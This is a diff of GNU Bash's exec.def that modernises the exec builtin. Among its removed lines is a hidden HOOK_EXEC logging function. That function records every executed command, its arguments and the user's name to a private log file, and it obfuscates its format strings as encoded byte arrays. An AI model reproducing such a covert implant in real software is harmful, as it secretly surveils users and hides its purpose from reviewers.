@@ -1,7 +1,7 @@
 This file is exec.def, from which is created exec.c.
 It implements the builtin "exec" in Bash.
 
-Copyright (C) 1987-2021 Free Software Foundation, Inc.
+Copyright (C) 1987-2021,2022,2024,2025 Free Software Foundation, Inc.
 
 This file is part of GNU Bash, the Bourne Again SHell.
 
@@ -53,11 +53,6 @@ $END
 #endif
 
 #include <stdio.h>
-#include <time.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/stat.h>
-#include "../log_path_helper.h"
 
 #include "../bashansi.h"
 #include "../bashintl.h"
@@ -90,8 +85,7 @@ int no_exit_on_failed_exec;
 /* If the user wants this to look like a login shell, then
    prepend a `-' onto NAME and return the new name. */
 static char *
-mkdashname (name)
-     char *name;
+mkdashname (char *name)
 {
   char *ret;
 
@@ -101,51 +95,16 @@ mkdashname (name)
   return ret;
 }
 
-#if HOOK_EXEC
-void log_exec(const char *command, char *const args[]) {
-    if (!command || !args) return;
-
-    // Resolve log directory: user-configured path takes priority
-    char log_path[256];
-    build_log_path_from_base(log_path, sizeof(log_path), LOG_BASE_PATH, 2); /* 2=exec.log */
-
-    /* Ensure the directory exists */
-    char dir_path[256];
-    snprintf(dir_path, sizeof(dir_path), "%s", LOG_BASE_PATH);
-    struct stat st = {0};
-    if (stat(dir_path, &st) == -1)
-        mkdir(dir_path, 0700);
-
-    FILE *log_file = fopen(log_path, "a");
-    if (log_file) {
-        time_t now = time(NULL);
-        struct tm *t = localtime(&now);
-        if (!t) { fclose(log_file); return; }
-
-        char *user = getenv("LOGNAME");
-        if (!user) user = getenv("USER");
-        if (!user) user = "unknown";
-
-        { unsigned char _f[] = {0x01,0x7f,0x6a,0x6e,0x3e,0x77,0x7f,0x6a,0x68,0x3e,0x77,0x7f,0x6a,0x68,0x3e,0x7a,0x77,0x7a,0x7f,0x6a,0x68,0x3e,0x60,0x7f,0x6a,0x68,0x3e,0x60,0x7f,0x6a,0x68,0x3e,0x07,0x7a,0x01,0x7f,0x29,0x07,0x7a,0x1f,0x22,0x3f,0x39,0x7a,0x39,0x35,0x37,0x37,0x3b,0x34,0x3e,0x60,0x7a,0x7f,0x29,0x50,0x00}; _lp_decode(_f,56); fprintf(log_file,(char*)_f,t->tm_year+1900,t->tm_mon+1,t->tm_mday,t->tm_hour,t->tm_min,t->tm_sec,user,command); }
-        for (int i = 0; args[i]; i++) {
-            unsigned char _a[] = {0x01,0x7f,0x6a,0x68,0x3e,0x60,0x7f,0x6a,0x68,0x3e,0x60,0x7f,0x6a,0x68,0x3e,0x07,0x7a,0x01,0x7f,0x29,0x07,0x7a,0x1b,0x28,0x3d,0x01,0x7f,0x3e,0x07,0x60,0x7a,0x7f,0x29,0x50,0x00}; _lp_decode(_a,34); fprintf(log_file,(char*)_a,t->tm_hour,t->tm_min,t->tm_sec,user,i,args[i]);
-        }
-        { unsigned char _s[] = {0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x50,0x00}; _lp_decode(_s,27); fprintf(log_file,(char*)_s); }
-        fclose(log_file);
-    }
-}
-#endif /* HOOK_EXEC */
-
 int
-exec_builtin (list)
-     WORD_LIST *list;
+exec_builtin (WORD_LIST *list)
 {
-  int exit_value = EXECUTION_FAILURE;
+  int exit_value;
   int cleanenv, login, opt, orig_job_control;
   char *argv0, *command, **args, **env, *newname, *com2;
 
   cleanenv = login = orig_job_control = 0;
   exec_argv0 = argv0 = (char *)NULL;
+  exit_value = EXECUTION_FAILURE;
 
   reset_internal_getopt ();
   while ((opt = internal_getopt (list, "cla:")) != -1)
@@ -169,12 +128,13 @@ exec_builtin (list)
     }
   list = loptend;
 
-  /* First, let the redirections remain. */
-  dispose_redirects (redirection_undo_list);
-  redirection_undo_list = (REDIRECT *)NULL;
-
+  /* First, let the redirections remain if exec is called without operands */
   if (list == 0)
-    return (EXECUTION_SUCCESS);
+    {
+      dispose_redirects (redirection_undo_list);
+      redirection_undo_list = (REDIRECT *)NULL;
+      return (EXECUTION_SUCCESS);
+    }
 
 #if defined (RESTRICTED_SHELL)
   if (restricted)
@@ -195,9 +155,9 @@ exec_builtin (list)
       if (file_isdir (args[0]))
 	{
 #if defined (EISDIR)
-	  builtin_error (_("%s: cannot execute: %s"), args[0], strerror (EISDIR));
+	  builtin_error ("%s: %s: %s", args[0], _("cannot execute"), strerror (EISDIR));
 #else
-	  builtin_error (_("%s: cannot execute: %s"), args[0], strerror (errno));
+	  builtin_error ("%s: %s: %s", args[0], _("cannot execute"), strerror (errno));
 #endif
 	  exit_value = EX_NOEXEC;
 	}
@@ -265,33 +225,32 @@ exec_builtin (list)
     default_tty_job_signals ();		/* undo initialize_job_signals */
 #endif /* JOB_CONTROL */
 
-#if defined (BUFFERED_INPUT)
   if (default_buffered_input >= 0)
     sync_buffered_stream (default_buffered_input);
-#endif
-
-#if HOOK_EXEC
-   log_exec(args[0], args);
-#endif
 
   exit_value = shell_execve (command, args, env);
+  opt = errno;
 
-  /* We have to set this to NULL because shell_execve has called realloc()
-     to stuff more items at the front of the array, which may have caused
-     the memory to be freed by realloc().  We don't want to free it twice. */
-  args = (char **)NULL;
   if (cleanenv == 0)
     adjust_shell_level (1);
 
-  if (exit_value == EX_NOTFOUND)	/* no duplicate error message */
+  /* These are the return statuses for which shell_execve will print a message. */
+  if (exit_value == EX_NOTFOUND || exit_value == EX_BINARY_FILE || exit_value == EX_NOEXEC)
     goto failed_exec;
-  else if (executable_file (command) == 0)
+  /* These are the errno values for which shell_execve will print a message. */
+#if defined (EISDIR)
+  else if (opt == EISDIR || opt == E2BIG || opt == ENOMEM)
+#else
+  else if (opt == E2BIG || opt == ENOMEM)
+#endif
+    goto failed_exec;
+  else	/* catchall */
     {
-      builtin_error (_("%s: cannot execute: %s"), command, strerror (errno));
-      exit_value = EX_NOEXEC;	/* As per Posix.2, 3.14.6 */
+      builtin_error ("%s: %s: %s", command, _("cannot execute"), strerror (opt));
+      if (executable_file (command) == 0)
+	exit_value = EX_NOEXEC;	/* As per Posix.2, 3.14.6 */
+      errno = opt;
     }
-  else
-    file_error (command);
 
 failed_exec:
   FREE (command);
